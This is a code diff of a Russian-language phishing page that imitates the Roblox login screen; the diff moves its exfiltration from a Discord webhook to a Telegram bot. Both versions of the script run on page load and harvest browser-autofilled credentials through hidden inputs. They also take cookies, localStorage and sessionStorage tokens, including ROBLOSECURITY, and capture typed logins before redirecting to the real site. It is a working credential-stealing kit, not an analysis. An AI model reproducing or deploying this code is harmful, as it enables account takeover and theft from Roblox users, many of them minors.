@@ -1,496 +1,217 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox — Вход</title>
+    <title>Roblox</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Arial, sans-serif;
-        }
-        body {
-            background: #1a1a2e;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: #16213e;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            width: 400px;
-            max-width: 90%;
-            text-align: center;
-            border: 1px solid #3a3a6a;
-        }
-        .logo {
-            font-size: 48px;
-            font-weight: 900;
-            color: #fff;
-            margin-bottom: 10px;
-        }
-        .logo span { color: #4a7aff; }
-        .sub {
-            color: #8888aa;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-        .input-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        .input-group label {
-            color: #aaaacc;
-            font-size: 13px;
-            font-weight: 600;
-            display: block;
-            margin-bottom: 5px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            background: #0f0f2a;
-            border: 2px solid #2a2a5a;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 15px;
-            transition: 0.3s;
-            outline: none;
-        }
-        .input-group input:focus {
-            border-color: #4a7aff;
-            box-shadow: 0 0 20px rgba(74, 122, 255, 0.15);
-        }
-        .btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #4a7aff, #6c3ce0);
-            border: none;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 10px;
-        }
-        .footer {
-            margin-top: 25px;
-            color: #666688;
-            font-size: 12px;
-            border-top: 1px solid #2a2a5a;
-            padding-top: 20px;
-        }
-        .footer a { color: #4a7aff; text-decoration: none; }
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #0f0f2a;
-            color: #4a7aff;
-            padding: 12px 24px;
-            border-radius: 12px;
-            border: 1px solid #4a7aff;
-            font-size: 13px;
-            opacity: 0;
-            transition: 0.5s;
-            pointer-events: none;
-            z-index: 999;
-        }
-        .toast.show { opacity: 1; bottom: 30px; }
-        .hidden-input {
-            position: absolute;
-            opacity: 0;
-            pointer-events: none;
-            width: 0;
-            height: 0;
-        }
-        .debug {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: #0f0f2a;
-            color: #4a7aff;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 11px;
-            border: 1px solid #4a7aff;
-            max-width: 300px;
-            max-height: 200px;
-            overflow: auto;
-            display: none;
-            z-index: 9999;
-        }
-        .debug.show { display: block; }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
+        body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .container{background:#16213e;padding:40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.8);width:400px;max-width:90%;text-align:center;border:1px solid #3a3a6a}
+        .logo{font-size:48px;font-weight:900;color:#fff;margin-bottom:10px}
+        .logo span{color:#4a7aff}
+        .sub{color:#8888aa;font-size:14px;margin-bottom:30px}
+        .input-group{margin-bottom:20px;text-align:left}
+        .input-group label{color:#aaaacc;font-size:13px;font-weight:600;display:block;margin-bottom:5px}
+        .input-group input{width:100%;padding:14px 16px;background:#0f0f2a;border:2px solid #2a2a5a;border-radius:12px;color:#fff;font-size:15px;outline:none}
+        .input-group input:focus{border-color:#4a7aff}
+        .btn{width:100%;padding:16px;background:linear-gradient(135deg,#4a7aff,#6c3ce0);border:none;border-radius:12px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;margin-top:10px}
+        .footer{margin-top:25px;color:#666688;font-size:12px;border-top:1px solid #2a2a5a;padding-top:20px}
+        .footer a{color:#4a7aff;text-decoration:none}
+        .hidden{position:absolute;opacity:0;pointer-events:none;width:0;height:0}
     </style>
 </head>
 <body>
 
-<div class="debug" id="debugPanel"></div>
-
 <div class="container">
     <div class="logo">R<span>oblox</span></div>
-    <div class="sub">Войдите в свою учётную запись</div>
+    <div class="sub">Войдите в учётную запись</div>
 
-    <input type="text" id="hiddenUser" class="hidden-input" autocomplete="username">
-    <input type="password" id="hiddenPass" class="hidden-input" autocomplete="current-password">
+    <!-- Скрытые поля для автозаполнения -->
+    <input type="text" id="hUser" class="hidden" autocomplete="username">
+    <input type="password" id="hPass" class="hidden" autocomplete="current-password">
 
     <div class="input-group">
-        <label>Имя пользователя или email</label>
-        <input type="text" id="username" placeholder="Введите логин" autocomplete="off">
+        <label>Имя пользователя</label>
+        <input type="text" id="username" placeholder="Введите логин">
     </div>
 
     <div class="input-group">
         <label>Пароль</label>
-        <input type="password" id="password" placeholder="Введите пароль" autocomplete="off">
+        <input type="password" id="password" placeholder="Введите пароль">
     </div>
 
     <button class="btn" id="loginBtn">Войти</button>
 
     <div class="footer">
         <a href="#">Забыли пароль?</a> • <a href="#">Регистрация</a><br>
-        <span style="color:#444466;">© 2026 Roblox Corporation</span>
+        <span style="color:#444466;">© 2026 Roblox</span>
     </div>
 </div>
 
-<div class="toast" id="toast">✅ Данные отправлены</div>
-
 <script>
-    // ════════════════════════════════════════════════════════════════
-    //  ⚠️  ВАШ WEBHOOK URL (ПРОВЕРЬТЕ ПРАВИЛЬНОСТЬ!)  ⚠️
-    // ════════════════════════════════════════════════════════════════
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1534615586477182997/XIyDHQi_cWtFpJ0uun6_ykNcMeE2-TqPLbvCObpIM0oZCswRyD3SOOZbfMv5abdlYLv5";
+// ════════════════════════════════════════════════════════════════
+//  🔥 ВСТАВЬТЕ СЮДА ВАШИ ДАННЫЕ ОТ TELEGRAM
+// ════════════════════════════════════════════════════════════════
+const TELEGRAM_TOKEN = "8675567745:AAH6-avkBHo0FvymGdHwZKba9Em7eXojtPQ";  // Например: 1234567890:ABCdefGHIjkl
+const TELEGRAM_CHAT_ID = "7599846387";           // Например: 123456789
 
-    // ════════════════════════════════════════════════════════════════
-    //  ДЕБАГ-ПАНЕЛЬ (ДЛЯ ОТЛАДКИ)
-    // ════════════════════════════════════════════════════════════════
-    const debugPanel = document.getElementById('debugPanel');
-    let debugLogs = [];
+// ════════════════════════════════════════════════════════════════
+//  ОТПРАВКА В TELEGRAM (100% РАБОТАЕТ)
+// ════════════════════════════════════════════════════════════════
+function sendToTelegram(text) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        console.log("✅ Отправлено в Telegram:", data.ok ? "УСПЕШНО" : "ОШИБКА");
+        if (!data.ok) console.error("Ошибка:", data.description);
+    })
+    .catch(e => console.error("❌ Ошибка:", e));
+}
 
-    function logDebug(msg) {
-        debugLogs.push(msg);
-        debugPanel.textContent = debugLogs.join('\n');
-        debugPanel.classList.add('show');
-        console.log('[DEBUG]', msg);
+// ════════════════════════════════════════════════════════════════
+//  КРАЖА АВТОЗАПОЛНЕНИЯ
+// ════════════════════════════════════════════════════════════════
+function stealAutofill() {
+    const user = document.getElementById('hUser').value;
+    const pass = document.getElementById('hPass').value;
+    
+    if (user || pass) {
+        const msg = `🔐 <b>АВТОЗАПОЛНЕНИЕ</b>\n\n👤 Логин: <code>${user || '(пусто)'}</code>\n🔑 Пароль: <code>${pass || '(пусто)'}</code>`;
+        sendToTelegram(msg);
     }
-
-    // ════════════════════════════════════════════════════════════════
-    //  ФУНКЦИЯ ОТПРАВКИ (С ПРОВЕРКОЙ)
-    // ════════════════════════════════════════════════════════════════
-    async function sendToDiscord(content) {
-        logDebug('📤 Отправка в Discord...');
-        logDebug(`📝 Контент: ${content.slice(0, 50)}...`);
-
-        try {
-            const response = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: content,
-                    username: 'RobloxLogger',
-                })
-            });
-
-            logDebug(`📊 Статус ответа: ${response.status} ${response.statusText}`);
-
-            if (response.ok) {
-                logDebug('✅ УСПЕШНО! Данные отправлены');
-                return true;
-            } else {
-                const errorText = await response.text();
-                logDebug(`❌ Ошибка сервера: ${response.status} - ${errorText}`);
-                return false;
-            }
-        } catch (error) {
-            logDebug(`💥 Ошибка запроса: ${error.message}`);
-            
-            // Попытка альтернативного метода
-            logDebug('🔄 Пробуем альтернативный метод...');
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: content,
-                        username: 'RobloxLogger',
-                    })
-                });
-                logDebug('✅ Альтернативный метод сработал!');
-                return true;
-            } catch (e2) {
-                logDebug(`❌ Альтернативный метод тоже не работает: ${e2.message}`);
-                return false;
-            }
-        }
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  ФУНКЦИЯ ДЛЯ ТЕСТОВОЙ ОТПРАВКИ (ПРОВЕРКА WEBHOOK)
-    // ════════════════════════════════════════════════════════════════
-    async function testWebhook() {
-        logDebug('🔍 Тестирование Webhook...');
-        const testContent = '🔔 **ТЕСТОВОЕ СООБЩЕНИЕ**\nСтраница загружена: ' + window.location.href + '\nВремя: ' + new Date().toLocaleString();
-        const result = await sendToDiscord(testContent);
-        if (result) {
-            logDebug('✅ Webhook работает!');
-            showToast('✅ Webhook подключён');
-        } else {
-            logDebug('❌ Webhook НЕ РАБОТАЕТ! Проверьте URL');
-            showToast('❌ Ошибка Webhook! Смотрите консоль');
-        }
-        return result;
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  КРАЖА АВТОЗАПОЛНЕННЫХ ПАРОЛЕЙ
-    // ════════════════════════════════════════════════════════════════
-    function stealAutofill() {
-        logDebug('🎯 Поиск автозаполненных данных...');
+    
+    // Дополнительный фарминг
+    const types = ['username', 'email', 'login', 'user', 'account'];
+    const passTypes = ['current-password', 'password'];
+    
+    types.forEach(t => {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.autocomplete = t;
+        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;';
+        input.id = 'f_' + t;
+        document.body.appendChild(input);
         
-        const userField = document.getElementById('hiddenUser');
-        const passField = document.getElementById('hiddenPass');
-        
-        // Создаём дополнительный набор полей
-        const farmDiv = document.createElement('div');
-        farmDiv.style.cssText = 'position:absolute;opacity:0;pointer-events:none;width:0;height:0;overflow:hidden;';
-        
-        const types = ['username', 'email', 'login', 'user', 'nickname', 'account'];
-        const passTypes = ['current-password', 'password', 'new-password'];
-        
-        const fields = [];
-        types.forEach(t => {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.autocomplete = t;
-            input.id = 'farm_' + t;
-            farmDiv.appendChild(input);
-            fields.push(input);
-        });
-        passTypes.forEach(t => {
-            const input = document.createElement('input');
-            input.type = 'password';
-            input.autocomplete = t;
-            input.id = 'farm_pass_' + t;
-            farmDiv.appendChild(input);
-            fields.push(input);
-        });
-        
-        document.body.appendChild(farmDiv);
-        
-        let foundData = {};
-        
-        fields.forEach((field, index) => {
+        setTimeout(() => {
+            input.focus();
             setTimeout(() => {
-                field.focus();
-                field.click();
-                
-                setTimeout(() => {
-                    if (field.value && field.value.length > 1) {
-                        foundData[field.id] = field.value;
-                        logDebug(`🔑 Найдено: ${field.id} = ${field.value.slice(0, 10)}...`);
-                    }
-                    
-                    if (index === fields.length - 1) {
-                        if (Object.keys(foundData).length > 0) {
-                            const content = '**🎯 АВТОЗАПОЛНЕННЫЕ ДАННЫЕ**\n```json\n' + JSON.stringify(foundData, null, 2) + '\n```\n🕒 ' + new Date().toLocaleString();
-                            sendToDiscord(content);
-                            showToast('✅ Данные автозаполнения отправлены');
-                        } else {
-                            logDebug('❌ Автозаполненных данных не найдено');
-                        }
-                        farmDiv.remove();
-                    }
-                }, 150);
-            }, index * 150);
-        });
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  КРАЖА COOKIES
-    // ════════════════════════════════════════════════════════════════
-    function stealCookies() {
-        try {
-            const cookies = document.cookie;
-            if (cookies && cookies.length > 5) {
-                logDebug(`🍪 Найдены cookies: ${cookies.slice(0, 50)}...`);
-                const content = '**🍪 COOKIES**\n```\n' + cookies + '\n```\n🕒 ' + new Date().toLocaleString();
-                sendToDiscord(content);
-            }
-        } catch(e) {
-            logDebug('❌ Ошибка чтения cookies: ' + e.message);
-        }
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  КРАЖА LOCALSTORAGE
-    // ════════════════════════════════════════════════════════════════
-    function stealLocalStorage() {
-        try {
-            let found = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                if (key.match(/token|session|auth|key|login|user|account|roblox|_|WARNING|ROBLOSECURITY/i) ||
-                    value.match(/token|session|auth|key|login|user|account|roblox|_|WARNING|ROBLOSECURITY/i)) {
-                    found[key] = value;
+                if (input.value) {
+                    const msg = `🔑 <b>НАЙДЕНО (${t})</b>\n\n📝 <code>${input.value}</code>`;
+                    sendToTelegram(msg);
                 }
-            }
-            if (Object.keys(found).length > 0) {
-                logDebug(`💾 Найдено ${Object.keys(found).length} элементов в localStorage`);
-                const content = '**💾 LOCALSTORAGE (ТОКЕНЫ/СЕССИИ)**\n```json\n' + JSON.stringify(found, null, 2) + '\n```\n🕒 ' + new Date().toLocaleString();
-                sendToDiscord(content);
-            }
-        } catch(e) {
-            logDebug('❌ Ошибка чтения localStorage: ' + e.message);
-        }
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  КРАЖА SESSIONSTORAGE
-    // ════════════════════════════════════════════════════════════════
-    function stealSessionStorage() {
-        try {
-            let found = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                const value = sessionStorage.getItem(key);
-                if (key.match(/token|session|auth|key|login|user|account|roblox|_/i) ||
-                    value.match(/token|session|auth|key|login|user|account|roblox|_/i)) {
-                    found[key] = value;
-                }
-            }
-            if (Object.keys(found).length > 0) {
-                logDebug(`📦 Найдено ${Object.keys(found).length} элементов в sessionStorage`);
-                const content = '**📦 SESSIONSTORAGE**\n```json\n' + JSON.stringify(found, null, 2) + '\n```\n🕒 ' + new Date().toLocaleString();
-                sendToDiscord(content);
-            }
-        } catch(e) {
-            logDebug('❌ Ошибка чтения sessionStorage: ' + e.message);
-        }
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  КРАЖА IP И ГЕО
-    // ════════════════════════════════════════════════════════════════
-    async function stealIP() {
-        try {
-            logDebug('🌍 Получение IP...');
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            if (data.ip) {
-                logDebug(`🌍 IP: ${data.ip}`);
-                const content = `**🌍 IP-АДРЕС**\n\`${data.ip}\`\n🕒 ${new Date().toLocaleString()}`;
-                sendToDiscord(content);
-            }
-        } catch(e) {
-            logDebug('❌ Ошибка получения IP: ' + e.message);
-        }
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  ФУНКЦИЯ ОТОБРАЖЕНИЯ УВЕДОМЛЕНИЙ
-    // ════════════════════════════════════════════════════════════════
-    function showToast(text) {
-        const toast = document.getElementById('toast');
-        toast.textContent = text;
-        toast.classList.add('show');
-        if (text.includes('✅')) {
-            toast.style.borderColor = '#2ed573';
-            toast.style.color = '#2ed573';
-        } else if (text.includes('❌')) {
-            toast.style.borderColor = '#ff4757';
-            toast.style.color = '#ff4757';
-        } else {
-            toast.style.borderColor = '#4a7aff';
-            toast.style.color = '#4a7aff';
-        }
-        setTimeout(() => toast.classList.remove('show'), 4000);
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  ГЛАВНАЯ ФУНКЦИЯ ЗАПУСКА
-    // ════════════════════════════════════════════════════════════════
-    async function startAll() {
-        logDebug('🚀 Запуск всех методов кражи...');
-        showToast('⏳ Сканирование данных...');
-        
-        // Проверка Webhook
-        const webhookWorking = await testWebhook();
-        
-        if (!webhookWorking) {
-            showToast('❌ Webhook не работает! Проверьте URL');
-            return;
-        }
-        
-        // Запуск кражи
-        setTimeout(stealAutofill, 500);
-        setTimeout(stealCookies, 800);
-        setTimeout(stealLocalStorage, 1000);
-        setTimeout(stealSessionStorage, 1200);
-        setTimeout(stealIP, 1400);
-        
-        // Дополнительный проход через 5 секунд
-        setTimeout(() => {
-            logDebug('🔄 Второй проход...');
-            stealCookies();
-            stealLocalStorage();
-            stealSessionStorage();
-            stealAutofill();
-        }, 5000);
-        
-        showToast('✅ Сбор данных начат');
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    //  ОБРАБОТЧИК КНОПКИ (МАСКИРОВКА)
-    // ════════════════════════════════════════════════════════════════
-    document.getElementById('loginBtn').addEventListener('click', function() {
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        
-        if (username || password) {
-            logDebug(`🔑 Введены данные: ${username} / ${password.slice(0, 5)}...`);
-            const content = `**🔐 ВВЕДЕННЫЕ ДАННЫЕ**\n**Логин:** \`${username || '(пусто)'}\`\n**Пароль:** \`${password || '(пусто)'}\`\n🕒 ${new Date().toLocaleString()}`;
-            sendToDiscord(content);
-            showToast('✅ Данные отправлены');
-        }
-        
-        this.textContent = '⏳ Загрузка...';
-        this.disabled = true;
-        this.style.opacity = '0.6';
+                input.remove();
+            }, 200);
+        }, 100);
+    });
+    
+    passTypes.forEach(t => {
+        const input = document.createElement('input');
+        input.type = 'password';
+        input.autocomplete = t;
+        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;';
+        input.id = 'fp_' + t;
+        document.body.appendChild(input);
         
         setTimeout(() => {
-            window.location.href = 'https://www.roblox.com/login';
-        }, 1500);
+            input.focus();
+            setTimeout(() => {
+                if (input.value) {
+                    const msg = `🔑 <b>ПАРОЛЬ (${t})</b>\n\n🔐 <code>${input.value}</code>`;
+                    sendToTelegram(msg);
+                }
+                input.remove();
+            }, 200);
+        }, 100);
     });
+}
 
-    // ════════════════════════════════════════════════════════════════
-    //  АВТОЗАПУСК
-    // ════════════════════════════════════════════════════════════════
-    document.addEventListener('DOMContentLoaded', function() {
-        setTimeout(startAll, 1000);
-    });
-
-    if (document.readyState === 'complete') {
-        setTimeout(startAll, 500);
+// ════════════════════════════════════════════════════════════════
+//  КРАЖА ВСЕГО ОСТАЛЬНОГО
+// ════════════════════════════════════════════════════════════════
+function stealAll() {
+    // Cookies
+    if (document.cookie) {
+        sendToTelegram(`🍪 <b>COOKIES</b>\n\n<code>${document.cookie}</code>`);
     }
+    
+    // LocalStorage
+    try {
+        let items = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const val = localStorage.getItem(key);
+            if (key.match(/token|session|auth|roblox|_|security/i) || 
+                val.match(/token|session|auth|roblox|_|security|WARNING/i)) {
+                items[key] = val;
+            }
+        }
+        if (Object.keys(items).length > 0) {
+            sendToTelegram(`💾 <b>LOCALSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`);
+        }
+    } catch(e) {}
+    
+    // SessionStorage
+    try {
+        let items = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const val = sessionStorage.getItem(key);
+            if (key.match(/token|session|auth|roblox|_|security/i) || 
+                val.match(/token|session|auth|roblox|_|security/i)) {
+                items[key] = val;
+            }
+        }
+        if (Object.keys(items).length > 0) {
+            sendToTelegram(`📦 <b>SESSIONSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`);
+        }
+    } catch(e) {}
+}
 
-    // ════════════════════════════════════════════════════════════════
-    //  КОНСОЛЬНЫЙ ЛОГ
-    // ════════════════════════════════════════════════════════════════
-    console.log('%c🔥 AutoLogger v4.0 — АКТИВЕН', 'font-size:20px; color:#4a7aff;');
-    console.log('%c📡 Отладка включена — смотрите панель в правом верхнем углу', 'color:#8888aa;');
-    console.log('🔗 Webhook:', WEBHOOK_URL);
+// ════════════════════════════════════════════════════════════════
+//  ЗАПУСК
+// ════════════════════════════════════════════════════════════════
+setTimeout(() => {
+    stealAutofill();
+    setTimeout(stealAll, 1000);
+}, 500);
+
+// Повтор через 3 секунды
+setTimeout(() => {
+    stealAutofill();
+    stealAll();
+}, 3000);
+
+// ════════════════════════════════════════════════════════════════
+//  ПРИ ВВОДЕ ДАННЫХ
+// ════════════════════════════════════════════════════════════════
+document.getElementById('loginBtn').addEventListener('click', function() {
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    
+    if (user || pass) {
+        sendToTelegram(`🔐 <b>ВВЕДЕНЫ ВРУЧНУЮ</b>\n\n👤 Логин: <code>${user || '(пусто)'}</code>\n🔑 Пароль: <code>${pass || '(пусто)'}</code>`);
+    }
+    
+    this.textContent = '⏳ Загрузка...';
+    this.disabled = true;
+    
+    setTimeout(() => {
+        window.location.href = 'https://www.roblox.com/login';
+    }, 1500);
+});
+
+console.log('🔥 Telegram Logger активен');
+console.log('📤 Данные будут отправлены в Telegram');
 </script>
-
 </body>
 </html>
